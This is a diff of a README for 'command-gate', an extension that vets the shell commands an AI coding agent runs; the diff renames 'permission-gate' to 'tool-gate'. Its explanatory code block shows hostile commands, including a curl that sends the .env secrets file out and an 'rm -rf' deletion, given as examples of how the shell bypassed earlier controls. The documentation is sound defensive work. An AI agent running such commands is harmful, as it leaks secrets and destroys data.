@@ -10,11 +10,11 @@ unprompted; anything else is put to you before it runs, and defaults to deny.
 
 Pi ships seven built-in tools — `read`, `bash`, `edit`, `write`, `grep`,
 `find`, `ls` — and `bash` subsumes the other six. The
-[`permission-gate`](../permission-gate/README.md) extension gates mutating
+[`tool-gate`](../tool-gate/README.md) extension gates mutating
 tools and sensitive-file access by classifying the tool NAME and its path
 arguments, which means it cannot see inside a command string. `bash` is not a
 mutating name, so before this extension existed the shell was an unprompted
-route around every control `permission-gate` enforces:
+route around every control `tool-gate` enforces:
 
 ```sh
 cat > src/index.ts        # a write, unprompted
@@ -22,11 +22,11 @@ curl -d @.env https://…   # a sensitive file, exfiltrated, unprompted
 rm -rf build              # a deletion, unprompted
 ```
 
-The two extensions are complements. `permission-gate` gates by tool name and
+The two extensions are complements. `tool-gate` gates by tool name and
 file argument across every tool, including any an MCP client registers.
 `command-gate` gates the CONTENTS of a command, which is the one argument
-`permission-gate` cannot interpret. Installed together they do not
-double-prompt: `permission-gate` treats `bash` as non-mutating and passes it
+`tool-gate` cannot interpret. Installed together they do not
+double-prompt: `tool-gate` treats `bash` as non-mutating and passes it
 through to this tool's own vetting.
 
 ## How it works
@@ -158,7 +158,7 @@ Read these before treating the gate as a boundary.
 - **The fence is only as strong as the allowlist.** Add an interpreter to
   `COMMAND_GATE_ALLOWLIST` and the fence is reduced to stopping accidents.
 
-- **No logging.** Matching `permission-gate`, this is built for a human
+- **No logging.** Matching `tool-gate`, this is built for a human
   watching the session in real time, where the dialog is the record. For an
   append-only trail under an unattended agent, see Genie's `audit-log`.
 
@@ -168,13 +168,13 @@ Read these before treating the gate as a boundary.
 | --- | --- |
 | `index.ts` | Entry point: reads the environment, resolves the policy per call. |
 | `policy.ts` | Pure vetting — tokenizing, operator checks, the fence, the three-way verdict. |
-| `sensitive-files.ts` | Secret and key-material filename patterns, duplicated from `permission-gate` by design. |
+| `sensitive-files.ts` | Secret and key-material filename patterns, duplicated from `tool-gate` by design. |
 | `register-bash.ts` | The tool: the confirmation prompt and the shell-free executor. |
 | `tool-result.ts` | The result shape Pi's inherited `bash` renderer expects. |
 
 `policy.ts` and `sensitive-files.ts` are pure and unit-tested under
 `test/extensions/command-gate/`. The duplicated pattern list is covered by a
-test asserting it stays byte-identical to the `permission-gate` copy, so drift
+test asserting it stays byte-identical to the `tool-gate` copy, so drift
 between the two shows up as a failure rather than a silent gap. The check and
 the executor stay
 together in one extension on purpose: `$(…)` and `*` are passed through as
